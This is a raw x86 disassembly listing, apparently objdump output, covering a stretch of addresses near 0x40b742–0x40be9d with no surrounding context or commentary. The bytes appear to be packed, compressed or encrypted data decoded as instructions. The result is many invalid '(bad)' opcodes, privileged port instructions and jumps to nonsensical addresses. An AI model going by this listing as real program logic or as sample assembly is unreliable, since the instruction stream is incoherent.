  40b742:	outs   dx,BYTE PTR ds:[esi]
  40b743:	(bad)  
  40b744:	ja     0x40b74c
  40b746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b747:	or     BYTE PTR [eax-0x5d4fe40b],dh
  40b74d:	sbb    bl,BYTE PTR [eax+ebp*1+0x4e258bca]
  40b754:	into   
  40b755:	hlt    
  40b756:	inc    ebx
  40b757:	push   eax
  40b758:	sub    DWORD PTR [ecx+0x66a4e330],edx
  40b75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b75f:	out    0x12,al
  40b761:	add    DWORD PTR [eax+0x3a301f59],ebp
  40b767:	(bad)  
  40b768:	gs adc ebx,ebp
  40b76b:	nop
  40b76c:	rcr    DWORD PTR [edx-0x61],cl
  40b76f:	or     al,0xb3
  40b771:	inc    edx
  40b772:	adc    dh,BYTE PTR [ebx-0x9e82f6d]
  40b778:	sbb    al,0xaf
  40b77a:	test   al,0x24
  40b77c:	mov    eax,0x1d3d490
  40b781:	push   esp
  40b782:	mov    BYTE PTR [ecx+eax*4+0x47052f97],cl
  40b789:	mov    dl,0x5f
  40b78b:	dec    ebx
  40b78c:	mov    al,ds:0xb74a4fe3
  40b791:	xchg   edx,eax
  40b792:	ss loopne 0x40b744
  40b795:	stos   DWORD PTR es:[edi],eax
  40b796:	jl     0x40b80a
  40b798:	mov    ch,0x42
  40b79a:	ss push ds
  40b79c:	mov    dh,0xf8
  40b79e:	pop    ecx
  40b79f:	iret   
  40b7a0:	sub    ch,BYTE PTR ds:[edx+eax*8-0x3633bfbd]
  40b7a8:	ja     0x40b7c4
  40b7aa:	mov    dh,0xb1
  40b7ac:	adc    bh,BYTE PTR [edx+0x2165200]
  40b7b2:	cdq    
  40b7b3:	mov    BYTE PTR [edi],ah
  40b7b5:	outs   dx,DWORD PTR ds:[esi]
  40b7b6:	and    eax,0xba2017c9
  40b7bb:	mov    cl,ah
  40b7bd:	push   es
  40b7be:	xchg   BYTE PTR [ecx-0x8],cl
  40b7c1:	daa    
  40b7c2:	ins    BYTE PTR es:[edi],dx
  40b7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c4:	(bad)  
  40b7c5:	lahf   
  40b7c6:	mov    cl,0xe5
  40b7c8:	pop    ecx
  40b7c9:	xor    ah,bh
  40b7cb:	fistp  WORD PTR [ebx]
  40b7cd:	lea    edi,[ebx-0x4c]
  40b7d0:	sbb    eax,0xd440ac76
  40b7d5:	aaa    
  40b7d6:	pop    esi
  40b7d7:	ror    DWORD PTR ds:0xe927e3d5,1
  40b7dd:	call   0x9e0d325a
  40b7e2:	dec    ebx
  40b7e3:	fs popa 
  40b7e5:	retf   
  40b7e6:	sahf   
  40b7e7:	into   
  40b7e8:	(bad)  
  40b7e9:	mov    esp,0xb296365f
  40b7ee:	stos   BYTE PTR es:[edi],al
  40b7ef:	bound  ebx,QWORD PTR [esi]
  40b7f1:	xor    ah,cl
  40b7f3:	and    bl,ch
  40b7f5:	cli    
  40b7f6:	ret    
  40b7f7:	mov    edi,0x555c29ae
  40b7fc:	xor    dl,cl
  40b7fe:	lods   eax,DWORD PTR ds:[esi]
  40b7ff:	je     0x40b786
  40b801:	xchg   esp,eax
  40b802:	mov    dh,0xe2
  40b804:	enter  0x4f8c,0x4
  40b808:	cmp    esi,DWORD PTR [edx-0x59578e0a]
  40b80e:	jns    0x40b7bd
  40b810:	jo     0x40b819
  40b812:	xor    eax,0x720106fa
  40b817:	jp     0x40b7ce
  40b819:	jl     0x40b880
  40b81b:	std    
  40b81c:	int    0x50
  40b81e:	nop
  40b81f:	shr    DWORD PTR [ecx],0x39
  40b822:	jns    0x40b842
  40b824:	int3   
  40b825:	jno    0x40b868
  40b827:	sbb    eax,0x882ac4e4
  40b82c:	adc    BYTE PTR gs:[ecx+edi*1+0x51],cl
  40b831:	push   ebx
  40b832:	call   FWORD PTR [ebx]
  40b834:	dec    eax
  40b835:	es rcr ah,0x61
  40b839:	adc    al,0xe9
  40b83b:	fs jmp 0x3d26:0x29e3ba6e
  40b843:	cmp    ebp,DWORD PTR [ebp-0x12ee906e]
  40b849:	lods   eax,DWORD PTR ds:[esi]
  40b84a:	xlat   BYTE PTR ds:[ebx]
  40b84b:	in     eax,dx
  40b84c:	fwait
  40b84d:	or     dl,ch
  40b84f:	sub    al,0x99
  40b851:	inc    ebp
  40b852:	in     eax,0xb3
  40b854:	out    dx,al
  40b855:	jo     0x40b7e5
  40b857:	call   0xb2ae8bfd
  40b85c:	mov    esp,0x6bf682a5
  40b861:	enter  0xf9b1,0xb7
  40b865:	mov    dh,0x72
  40b867:	and    edi,DWORD PTR [ecx+esi*4]
  40b86a:	xchg   BYTE PTR [edi-0x4d7113a0],bl
  40b870:	sub    BYTE PTR [ecx],ah
  40b872:	pop    edx
  40b873:	xor    BYTE PTR [edi+0x2d],ch
  40b876:	or     BYTE PTR [ebp-0x6233947d],0x3e
  40b87d:	cdq    
  40b87e:	pop    ebp
  40b87f:	sbb    cl,BYTE PTR [ebp+0x7e]
  40b882:	mov    ch,0xfd
  40b884:	js     0x40b8e7
  40b886:	ins    BYTE PTR es:[edi],dx
  40b887:	cmp    DWORD PTR [edx],esi
  40b889:	loopne 0x40b87c
  40b88b:	inc    esi
  40b88c:	(bad)  
  40b88d:	cld    
  40b88e:	jae    0x40b85f
  40b890:	mov    DWORD PTR [edi],eax
  40b892:	cmc    
  40b893:	jmp    0xad56a8ed
  40b898:	arpl   di,ax
  40b89a:	pop    es
  40b89b:	(bad)  
  40b89c:	imul   ecx,DWORD PTR gs:[edx],0x7bda0721
  40b8a3:	xchg   esi,eax
  40b8a4:	jae    0x40b827
  40b8a6:	(bad)  
  40b8a7:	jns    0x40b90d
  40b8a9:	cmp    eax,0xfeba1ffb
  40b8ae:	sbb    al,0xae
  40b8b0:	in     al,dx
  40b8b1:	aaa    
  40b8b2:	lods   al,BYTE PTR ds:[esi]
  40b8b3:	mov    WORD PTR [edx+0xc],?
  40b8b6:	sti    
  40b8b7:	lea    esp,[ecx+0x1f1edf3e]
  40b8bd:	push   ebp
  40b8be:	inc    ecx
  40b8bf:	adc    ah,BYTE PTR [esi+0x59]
  40b8c2:	mov    edi,0xcfe76f96
  40b8c7:	sbb    DWORD PTR [ebx],esi
  40b8c9:	mov    ch,cl
  40b8cb:	and    eax,0xd02f568a
  40b8d0:	(bad)
  40b8d3:	pop    eax
  40b8d4:	scas   al,BYTE PTR es:[edi]
  40b8d5:	mov    ds:0xe6527f58,al
  40b8da:	shl    BYTE PTR [esi-0x4af3b7e6],1
  40b8e0:	sar    BYTE PTR [edx+eiz*4],0xf9
  40b8e4:	adc    ebp,DWORD PTR [eax]
  40b8e6:	loop   0x40b8a6
  40b8e8:	sbb    ecx,DWORD PTR [ebx-0x373e65cd]
  40b8ee:	cmp    dl,BYTE PTR [esi+0x36]
  40b8f1:	add    eax,0x4dc3376e
  40b8f6:	pop    ebp
  40b8f7:	cmp    esp,ecx
  40b8f9:	lahf   
  40b8fa:	dec    ecx
  40b8fb:	push   edx
  40b8fc:	(bad)  
  40b8fe:	pop    ebx
  40b8ff:	mov    cl,0x8d
  40b902:	pop    edi
  40b903:	jae    0x40b93b
  40b905:	retf   
  40b906:	jl     0x40b93c
  40b908:	outs   dx,BYTE PTR ds:[esi]
  40b909:	mov    dh,0xd2
  40b90b:	loopne 0x40b8fd
  40b90d:	dec    edi
  40b90e:	ret    
  40b90f:	inc    ebp
  40b911:	in     eax,dx
  40b912:	das    
  40b913:	in     eax,0x86
  40b915:	in     eax,dx
  40b916:	push   ss
  40b917:	xor    al,0xe4
  40b919:	and    cl,BYTE PTR [esi]
  40b91b:	inc    ecx
  40b91c:	sbb    dh,BYTE PTR [ebx]
  40b91e:	mov    eax,cs:0x9a9d06c1
  40b924:	jns    0x40b8d4
  40b926:	xchg   BYTE PTR [ebp-0x7a8e801f],ch
  40b92c:	in     eax,dx
  40b92d:	cmp    al,0x8f
  40b92f:	nop
  40b930:	scas   al,BYTE PTR es:[edi]
  40b931:	add    BYTE PTR [edi+0x20d7cedc],dl
  40b937:	dec    eax
  40b938:	shr    BYTE PTR [edx],0x33
  40b93b:	jge    0x40b937
  40b93d:	mov    edi,0xc7662460
  40b942:	xchg   ecx,eax
  40b943:	xor    DWORD PTR [ecx-0x16d27b66],ebx
  40b949:	scas   eax,DWORD PTR es:[edi]
  40b94a:	ins    BYTE PTR es:[edi],dx
  40b94b:	rcr    BYTE PTR [esi+0x68],1
  40b94e:	xchg   ebp,eax
  40b94f:	je     0x40b8d6
  40b951:	dec    DWORD PTR [ebp+0x44]
  40b954:	push   0xffffffbd
  40b956:	xor    DWORD PTR [edi+0x28],esp
  40b959:	jp     0x40b8e9
  40b95b:	xor    al,0xbd
  40b95d:	add    BYTE PTR [ecx+0x3],bh
  40b960:	cs retf 0x37ba
  40b964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b965:	into   
  40b966:	pop    ecx
  40b967:	imul   ebp,DWORD PTR [esi+0x1a8f4cd8],0x3187c9db
  40b971:	rcr    DWORD PTR [esi-0x20f754aa],1
  40b977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b978:	loopne 0x40b917
  40b97a:	scas   eax,DWORD PTR es:[edi]
  40b97b:	cmp    ah,BYTE PTR [ebx]
  40b97d:	imul   ebp,DWORD PTR [eax-0x73841ce7],0x40
  40b984:	inc    eax
  40b985:	fld    TBYTE PTR [ecx+0x7a352e2d]
  40b98b:	xor    DWORD PTR gs:[ebp+ecx*8-0x7ea06a8f],ebp
  40b993:	aas    
  40b994:	(bad)  
  40b995:	xchg   edx,eax
  40b996:	arpl   WORD PTR [edx],dx
  40b998:	sbb    DWORD PTR [ecx],edx
  40b99a:	mov    al,BYTE PTR [ebx+ebp*2]
  40b99d:	xchg   esi,eax
  40b99e:	(bad)  
  40b99f:	je     0x40ba1d
  40b9a1:	inc    esp
  40b9a2:	push   0x79
  40b9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9a5:	pusha  
  40b9a6:	and    DWORD PTR [edi-0x232b56c2],esp
  40b9ac:	inc    ecx
  40b9ad:	lock mov bl,0x8b
  40b9b0:	add    bh,BYTE PTR [edx-0x4d8d9f79]
  40b9b6:	jbe    0x40b958
  40b9b8:	xchg   ebp,eax
  40b9b9:	or     ch,BYTE PTR [ebx+ebp*2-0x3f556321]
  40b9c0:	mov    cl,0x1b
  40b9c2:	das    
  40b9c3:	scas   eax,DWORD PTR es:[edi]
  40b9c4:	adc    eax,0x4056b75b
  40b9c9:	and    eax,0xd5658dc2
  40b9ce:	mov    esi,0x3e712d00
  40b9d3:	jmp    0xaa23:0x552f8fd4
  40b9da:	bound  ebp,QWORD PTR [eax+esi*2]
  40b9dd:	xchg   ebp,eax
  40b9de:	call   esi
  40b9e0:	add    edx,DWORD PTR [edi+0x44718d76]
  40b9e6:	push   eax
  40b9e7:	cmp    BYTE PTR [ebx],ah
  40b9e9:	inc    ebp
  40b9ea:	loop   0x40ba34
  40b9ec:	repnz or eax,ebx
  40b9ef:	or     BYTE PTR [edx],cl
  40b9f1:	push   ss
  40b9f2:	iret   
  40b9f3:	push   edi
  40b9f4:	mov    bl,0x59
  40b9f6:	dec    esp
  40b9f7:	xor    DWORD PTR [esi-0x6f16a7e8],ebx
  40b9fd:	shl    DWORD PTR [esi-0x67],0x5
  40ba01:	xchg   esi,eax
  40ba02:	pop    eax
  40ba03:	pop    edi
  40ba04:	(bad)  
  40ba05:	(bad)  
  40ba06:	jle    0x40ba86
  40ba08:	cld    
  40ba09:	test   BYTE PTR [edi-0x3c],bl
  40ba0c:	push   0x32
  40ba0e:	les    esi,FWORD PTR [eax+0x89226fb]
  40ba14:	shl    DWORD PTR [esi],cl
  40ba16:	mov    dh,0x9
  40ba18:	out    dx,eax
  40ba19:	mov    DWORD PTR [edx],ecx
  40ba1b:	jp     0x40ba60
  40ba1d:	pop    edx
  40ba1e:	pusha  
  40ba1f:	pop    ds
  40ba20:	fwait
  40ba21:	sbb    dl,ah
  40ba23:	inc    ebp
  40ba24:	adc    al,0x73
  40ba26:	mov    eax,0xe01ee2da
  40ba2b:	test   eax,0xed0d6adf
  40ba30:	or     DWORD PTR [edx],edx
  40ba32:	pop    ebp
  40ba33:	add    edx,esi
  40ba35:	out    dx,al
  40ba36:	add    bh,ah
  40ba38:	mov    dl,0xf2
  40ba3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3b:	hlt    
  40ba3c:	(bad)  
  40ba3d:	(bad)  
  40ba3e:	mov    ecx,0x3521eb71
  40ba43:	icebp  
  40ba44:	call   0x6e0fdbbb
  40ba49:	sub    dl,ah
  40ba4b:	mov    esp,0xa204d507
  40ba50:	cmp    ebx,edx
  40ba52:	and    BYTE PTR [esp+esi*4],bh
  40ba55:	mov    BYTE PTR [esi],cl
  40ba57:	push   0x9f84fbb7
  40ba5c:	iret   
  40ba5d:	shl    DWORD PTR [ebx-0x42],1
  40ba60:	cmp    DWORD PTR [edi],0x80d245e6
  40ba66:	adc    DWORD PTR [ecx-0x8],0x5f2a61da
  40ba6d:	sbb    BYTE PTR [eax+0x6e5bc734],bl
  40ba73:	mov    cl,0xff
  40ba75:	cmp    ebp,DWORD PTR [ecx]
  40ba77:	xchg   ebp,eax
  40ba78:	stos   DWORD PTR es:[edi],eax
  40ba79:	pop    ebp
  40ba7a:	nop    DWORD PTR [esi-0xae1c54b]
  40ba81:	sahf   
  40ba82:	les    ecx,FWORD PTR [ebx+0x25]
  40ba85:	xchg   esi,eax
  40ba86:	inc    ebp
  40ba87:	or     al,BYTE PTR [ecx]
  40ba89:	mov    eax,0xbf01ffd2
  40ba8e:	fmul   st,st(2)
  40ba90:	outs   dx,BYTE PTR ds:[esi]
  40ba91:	mov    al,ds:0xb5431028
  40ba96:	push   ebp
  40ba97:	push   ecx
  40ba98:	scas   al,BYTE PTR es:[edi]
  40ba99:	ss add ecx,edx
  40ba9c:	jmp    0x2307636
  40baa1:	jg     0x40ba88
  40baa3:	in     al,0xd0
  40baa5:	xor    cl,BYTE PTR [esi-0x4e875c5d]
  40baab:	arpl   WORD PTR [eax-0x6c],cx
  40baae:	jge    0x40bb03
  40bab0:	int3   
  40bab1:	mov    eax,ds:0xbce6b72d
  40bab6:	cmp    DWORD PTR [ecx+0x72],ecx
  40bab9:	adc    dl,BYTE PTR [edi+0x331ec25e]
  40babf:	dec    ebp
  40bac0:	pop    ecx
  40bac1:	sbb    BYTE PTR [eax-0x6e],0xdb
  40bac5:	sbb    eax,0x42a5bd4e
  40baca:	pop    ebx
  40bacb:	test   al,0x38
  40bacd:	push   cs
  40bace:	pop    edx
  40bacf:	inc    ebp
  40bad0:	xor    ebp,DWORD PTR [edi-0x46355280]
  40bad6:	(bad)  
  40bad7:	pop    esp
  40bad8:	mov    dl,0x13
  40bada:	loope  0x40ba60
  40badc:	or     BYTE PTR [ebx+0x70],0xb3
  40bae0:	add    al,0x98
  40bae2:	jp     0x40bb54
  40bae4:	cmp    al,0x2b
  40bae6:	pop    ebp
  40bae7:	rol    BYTE PTR [edx-0x511d5c6a],0x64
  40baee:	mov    dl,0xef
  40baf0:	xchg   ebx,eax
  40baf1:	nop
  40baf2:	xor    esi,DWORD PTR [ecx-0x30]
  40baf5:	mov    ah,0xa8
  40baf7:	call   FWORD PTR [esi+0x7e]
  40bafa:	enter  0xcf54,0x4d
  40bafe:	or     edi,DWORD PTR [edi]
  40bb00:	out    dx,al
  40bb01:	jle    0x40bb13
  40bb03:	jge    0x40baa0
  40bb05:	sahf   
  40bb06:	fwait
  40bb07:	nop
  40bb08:	mov    ds,WORD PTR [edi-0x437e59e3]
  40bb0e:	inc    ebx
  40bb0f:	jl     0x40bae6
  40bb11:	sar    DWORD PTR [esi+0x30da341e],1
  40bb17:	lock fld DWORD PTR [esi+0x17d8b56d]
  40bb1f:	mov    cl,0xd5
  40bb21:	fidiv  WORD PTR [ebx]
  40bb23:	lahf   
  40bb24:	scas   eax,DWORD PTR es:[edi]
  40bb25:	lea    ebx,[ecx+0x4]
  40bb28:	(bad)  
  40bb29:	cmp    eax,0xf4b28772
  40bb2e:	adc    eax,0x209e0ecf
  40bb33:	inc    edx
  40bb34:	or     BYTE PTR [ecx-0x4867a392],0x4c
  40bb3b:	jo     0x40bb64
  40bb3d:	jnp    0x40bbb6
  40bb3f:	inc    ebp
  40bb40:	mov    DWORD PTR [edx-0x37],ebx
  40bb43:	adc    BYTE PTR [ebp-0x48],bl
  40bb46:	mov    al,0xc
  40bb48:	scas   eax,DWORD PTR es:[edi]
  40bb49:	repz ja 0x40bb4b
  40bb4c:	dec    edi
  40bb4d:	jge    0x40bbbc
  40bb4f:	icebp  
  40bb50:	mov    ds:0x8c1217a1,eax
  40bb55:	test   dh,ah
  40bb57:	test   BYTE PTR ds:0x7d9c5ef4,0x8c
  40bb5e:	inc    ecx
  40bb5f:	ret    
  40bb60:	into   
  40bb61:	dec    esi
  40bb62:	mov    ds:0x486ddd0c,al
  40bb67:	(bad)  
  40bb6b:	and    eax,0x23c6940c
  40bb70:	xor    DWORD PTR [edx],edi
  40bb72:	not    BYTE PTR ds:0x69d08753
  40bb78:	mov    bl,0xa5
  40bb7a:	dec    ecx
  40bb7b:	jbe    0x40bbb3
  40bb7d:	leave  
  40bb7e:	data16 (bad) 
  40bb80:	std    
  40bb81:	in     al,dx
  40bb82:	inc    esi
  40bb83:	cmp    BYTE PTR [ebp-0x6518882a],ah
  40bb89:	data16 and BYTE PTR [eax+0x2801bbaa],bl
  40bb90:	out    dx,al
  40bb91:	leave  
  40bb92:	cmp    eax,0x93cd20ed
  40bb97:	fisttp DWORD PTR fs:[eax-0x6876aa77]
  40bb9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb9f:	mov    ah,0x5
  40bba1:	stos   BYTE PTR es:[edi],al
  40bba2:	mov    DWORD PTR [edi+esi*2-0x15],edi
  40bba6:	aas    
  40bba7:	aad    0x27
  40bba9:	pop    edx
  40bbaa:	jae    0x40bb79
  40bbac:	and    BYTE PTR [esi+0x776674bf],dl
  40bbb2:	jb     0x40bbc1
  40bbb4:	ret    
  40bbb5:	test   DWORD PTR [ecx],edx
  40bbb7:	xchg   ebp,eax
  40bbb8:	mov    al,ds:0x6def588e
  40bbbd:	loopne 0x40bb4a
  40bbbf:	jno    0x40bbf7
  40bbc1:	push   ss
  40bbc2:	loop   0x40bc33
  40bbc4:	pop    ebx
  40bbc5:	dec    edi
  40bbc6:	xor    dl,cl
  40bbc8:	aas    
  40bbc9:	jnp    0x40bb59
  40bbcb:	adc    DWORD PTR [edx+ebx*8+0x344535eb],0xffffffa6
  40bbd3:	(bad)  
  40bbd4:	adc    eax,0x7fa7c7ba
  40bbd9:	popa   
  40bbda:	mov    ebp,0x7958c9d8
  40bbdf:	xchg   ecx,eax
  40bbe0:	dec    edx
  40bbe1:	imul   edx,edi,0x895558f8
  40bbe7:	test   eax,0xd5dcf298
  40bbec:	sbb    esp,DWORD PTR [edx+0x3fddf84b]
  40bbf2:	cli    
  40bbf3:	add    eax,0x9a620f47
  40bbf8:	jns    0x40bbf9
  40bbfa:	jmp    0x583f:0xd69e69fd
  40bc01:	out    0xd9,al
  40bc03:	and    BYTE PTR ds:0x47cc84d0,ah
  40bc09:	lahf   
  40bc0a:	fmulp  st(6),st
  40bc0c:	sbb    eax,0x99b88666
  40bc11:	sub    DWORD PTR [eax-0x50],ebp
  40bc14:	pusha  
  40bc15:	imul   ecx,DWORD PTR [edx-0x1ea8b1bf],0x4fc08952
  40bc1f:	sub    ah,0x8
  40bc22:	jmp    0x7392f399
  40bc27:	add    dl,BYTE PTR [edx+edx*1+0x7c9db963]
  40bc2e:	mov    ch,0x4a
  40bc30:	popf   
  40bc31:	and    al,0x1b
  40bc33:	mov    eax,0xdc713654
  40bc38:	push   ds
  40bc39:	xchg   ebx,eax
  40bc3a:	aas    
  40bc3b:	mov    eax,0x4a2e3350
  40bc40:	lea    edx,[edi]
  40bc42:	sahf   
  40bc43:	ror    BYTE PTR [ebp-0x6a],cl
  40bc46:	mov    cl,0x3c
  40bc48:	jne    0x40bcab
  40bc4a:	xchg   esi,eax
  40bc4b:	mov    ds:0x9ceb63a,eax
  40bc50:	adc    eax,0xb35a428a
  40bc55:	aam    0x40
  40bc57:	xchg   esp,eax
  40bc58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc59:	mov    ss,WORD PTR [edi]
  40bc5b:	clc    
  40bc5c:	addr16 into 
  40bc5e:	mov    dl,0x19
  40bc60:	or     eax,0xcdff697a
  40bc65:	repnz lock div bl
  40bc69:	iret   
  40bc6a:	cmc    
  40bc6b:	mov    esp,0xb570b262
  40bc70:	push   es
  40bc71:	dec    ebx
  40bc72:	and    eax,0xbc201b61
  40bc77:	(bad)  
  40bc78:	in     al,dx
  40bc79:	adc    DWORD PTR [eax+0x5a],esp
  40bc7c:	scas   eax,DWORD PTR es:[edi]
  40bc7d:	push   edi
  40bc7e:	push   cs
  40bc7f:	aam    0x6b
  40bc81:	cdq    
  40bc82:	rcr    BYTE PTR es:[eax-0x184614c5],cl
  40bc89:	pop    esi
  40bc8a:	sub    eax,0xd9ec778
  40bc8f:	mov    eax,ds:0x74f134a2
  40bc94:	xchg   BYTE PTR [edx+0x4734ca17],bh
  40bc9a:	in     al,dx
  40bc9b:	jno    0x40bd10
  40bc9d:	ffreep st(4)
  40bc9f:	in     eax,0x5a
  40bca1:	dec    ecx
  40bca2:	jmp    0x40bc4f
  40bca4:	jne    0x40bd05
  40bca6:	pop    ds
  40bca7:	jns    0x40bd28
  40bca9:	js     0x40bce6
  40bcab:	or     BYTE PTR [ecx+0x46fbf9b8],0xbd
  40bcb2:	aaa    
  40bcb3:	inc    esp
  40bcb4:	arpl   WORD PTR [edi+eax*8-0x541bf7d7],si
  40bcbb:	test   ebp,eax
  40bcbd:	fst    DWORD PTR [ecx+0x5c]
  40bcc0:	lds    eax,FWORD PTR [edx+0x15]
  40bcc3:	sti    
  40bcc4:	ins    DWORD PTR es:[edi],dx
  40bcc5:	stc    
  40bcc6:	mov    ecx,0x542ba218
  40bccb:	push   eax
  40bccc:	pop    ss
  40bccd:	mov    dl,0x6a
  40bccf:	pop    edx
  40bcd0:	fisttp QWORD PTR [ecx-0x4]
  40bcd3:	aaa    
  40bcd4:	xchg   DWORD PTR ds:0x2e8e3339,ecx
  40bcda:	into   
  40bcdb:	pop    es
  40bcdc:	jae    0x40bd0c
  40bcde:	mov    edx,0x5c2b43df
  40bce3:	mov    al,0x2
  40bce5:	sbb    esp,DWORD PTR [edi]
  40bce7:	cmp    DWORD PTR [eax-0x36],edi
  40bcea:	fidiv  DWORD PTR [eax-0x5484fd8b]
  40bcf0:	push   esi
  40bcf1:	pusha  
  40bcf2:	fbstp  TBYTE PTR [edi-0x559eedc1]
  40bcf8:	sahf   
  40bcf9:	xchg   ecx,eax
  40bcfa:	in     eax,0xae
  40bcfc:	push   cs
  40bcfd:	cmp    ebp,DWORD PTR [ebp+eax*2-0x693426d3]
  40bd04:	dec    eax
  40bd05:	daa    
  40bd06:	add    bh,ah
  40bd08:	addr16 pop es
  40bd0a:	ins    BYTE PTR es:[edi],dx
  40bd0b:	mov    ch,0x93
  40bd0d:	out    0xf8,eax
  40bd0f:	loope  0x40bd77
  40bd11:	mul    dh
  40bd13:	jmp    0x2df4:0x6d140f79
  40bd1a:	imul   ebp,edx,0xffffffe8
  40bd1d:	push   es
  40bd1e:	stc    
  40bd1f:	or     al,0x70
  40bd21:	add    cl,0x2e
  40bd24:	and    ch,dh
  40bd26:	int3   
  40bd27:	jno    0x40bd46
  40bd29:	add    BYTE PTR [esi],bh
  40bd2b:	xor    BYTE PTR [edi-0x54381ccf],dl
  40bd31:	arpl   WORD PTR [eax-0x37],bx
  40bd34:	jne    0x40bd38
  40bd36:	jbe    0x40bd0d
  40bd38:	mov    bh,0xdd
  40bd3a:	jno    0x40bccc
  40bd3c:	push   esi
  40bd3d:	and    eax,0x54020ba7
  40bd42:	fsub   QWORD PTR [edi+edi*4]
  40bd45:	pusha  
  40bd46:	pop    eax
  40bd47:	lods   eax,DWORD PTR ds:[esi]
  40bd48:	xor    esp,DWORD PTR [ebp-0x28847bda]
  40bd4e:	jmp    0xd3e1:0xf4b3c4c8
  40bd55:	mov    ebx,ecx
  40bd57:	sti    
  40bd58:	mov    DWORD PTR [ebp+0x2ad5c37b],edi
  40bd5e:	into   
  40bd5f:	xor    BYTE PTR [eax],dh
  40bd61:	lods   al,BYTE PTR ds:[esi]
  40bd62:	cmp    eax,0x61c5b7b6
  40bd67:	js     0x40bd3e
  40bd69:	lods   al,BYTE PTR ds:[esi]
  40bd6a:	jno    0x40bd92
  40bd6c:	scas   al,BYTE PTR es:[edi]
  40bd6d:	add    ecx,DWORD PTR [edi+0x55]
  40bd70:	(bad)  
  40bd71:	jne    0x40bdcc
  40bd73:	jp     0x40bd0d
  40bd75:	arpl   bp,cx
  40bd77:	pop    ecx
  40bd78:	and    BYTE PTR [ebx+0x50],ah
  40bd7b:	ja     0x40bd12
  40bd7d:	dec    esi
  40bd7e:	dec    edi
  40bd7f:	jg     0x40bd46
  40bd81:	mov    al,ds:0xe657629f
  40bd86:	pusha  
  40bd87:	mov    ebp,0x7c38c2d7
  40bd8c:	xor    BYTE PTR [ebx-0x5a],ah
  40bd8f:	ret    0x4660
  40bd92:	adc    eax,0xdd0d59d7
  40bd97:	and    ah,BYTE PTR [eax+0x44]
  40bd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd9b:	fstp   st(6)
  40bd9d:	mov    ds:0x6ba5db4d,al
  40bda2:	inc    eax
  40bda3:	mov    cl,0xaf
  40bda5:	rcl    ebp,cl
  40bda7:	aam    0xea
  40bda9:	or     eax,0x191ad6ee
  40bdae:	xchg   ebx,eax
  40bdaf:	cmp    cl,0xc0
  40bdb2:	mov    eax,ds:0xa0b851a0
  40bdb7:	cmp    esp,ecx
  40bdb9:	jb     0x40bde6
  40bdbb:	adc    BYTE PTR [ecx+0x2c],0x33
  40bdbf:	mov    ebx,0x2b384644
  40bdc4:	ja     0x40bd76
  40bdc6:	jo     0x40bda3
  40bdc8:	jo     0x40bd92
  40bdca:	cmp    DWORD PTR [esi+0xd],0x57
  40bdce:	add    al,BYTE PTR [edi]
  40bdd0:	mov    eax,es:0xafbcf5c0
  40bdd6:	xor    eax,0x95c05409
  40bddb:	jns    0x40be56
  40bddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdde:	daa    
  40bddf:	inc    esp
  40bde0:	jp     0x40be44
  40bde2:	cmp    esp,DWORD PTR [edx]
  40bde4:	fwait
  40bde5:	loopne 0x40bda8
  40bde7:	add    eax,0x80e2b1b5
  40bdec:	push   ebx
  40bded:	js     0x40be1a
  40bdef:	xchg   DWORD PTR [esi+0x60],ebp
  40bdf2:	test   al,0x61
  40bdf4:	fimul  DWORD PTR [edi+0xae18a58]
  40bdfa:	call   0xaedf:0x7515d35e
  40be01:	pushf  
  40be02:	pop    esi
  40be03:	push   edi
  40be04:	sbb    edx,ebx
  40be06:	(bad)  
  40be08:	xchg   edi,eax
  40be09:	int    0xa4
  40be0b:	gs sbb ch,bh
  40be0e:	mov    edi,esp
  40be10:	outs   dx,BYTE PTR ds:[esi]
  40be11:	sub    BYTE PTR [esp+edi*2-0x5e4e10d6],0x20
  40be19:	mov    bl,0xfe
  40be1b:	pop    edi
  40be1c:	sub    DWORD PTR [ebp-0x35],ebx
  40be1f:	push   esi
  40be20:	and    BYTE PTR [ebp-0x1f38b555],dh
  40be26:	sub    al,0x63
  40be28:	xor    edi,0x4b
  40be2b:	mov    esi,0x7db68a8
  40be30:	mov    ah,0xb
  40be32:	(bad)  
  40be34:	jge    0x40bde6
  40be36:	inc    edx
  40be37:	xchg   esi,eax
  40be38:	fstp   TBYTE PTR [eax+0x22f43edd]
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	jg     0x40be47
  40be41:	dec    ecx
  40be42:	mov    ah,0xf1
  40be44:	mov    ds:0x461e3392,al
  40be49:	pop    esp
  40be4a:	aam    0x8
  40be4c:	cmc    
  40be4d:	mov    ?,WORD PTR [edx+0x7]
  40be50:	test   eax,0xb2a89b02
  40be55:	fnsave [ebx+0x43]
  40be58:	(bad)  
  40be5a:	sub    eax,0xdcfd3738
  40be5f:	push   0xfffffff1
  40be61:	inc    esi
  40be62:	mov    al,0x69
  40be64:	mov    WORD PTR [esp+edi*8-0x43b6786b],ss
  40be6b:	es xchg ebp,eax
  40be6d:	out    0xa6,eax
  40be6f:	leave  
  40be70:	and    ebp,DWORD PTR [edi-0x358719d7]
  40be76:	and    al,0x28
  40be78:	je     0x40bedb
  40be7a:	aaa    
  40be7b:	inc    esi
  40be7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7d:	fwait
  40be7e:	or     DWORD PTR [ecx+0x5e],esi
  40be81:	stc    
  40be82:	fmul   QWORD PTR [edx+ebx*8+0x1a]
  40be86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be87:	xchg   ebx,eax
  40be88:	pop    eax
  40be89:	dec    ecx
  40be8a:	push   0x3bdd50d5
  40be8f:	sub    BYTE PTR [ebx-0x3f],al
  40be92:	test   DWORD PTR [esi],ecx
  40be94:	xchg   ecx,eax
  40be95:	sahf   
  40be96:	repnz dec ebp
  40be98:	aas    
  40be99:	stc    
  40be9a:	push   ebp
  40be9b:	mov    dh,0x8b
  40be9d:	rcr    DWORD PTR [ebx+0x4b],cl
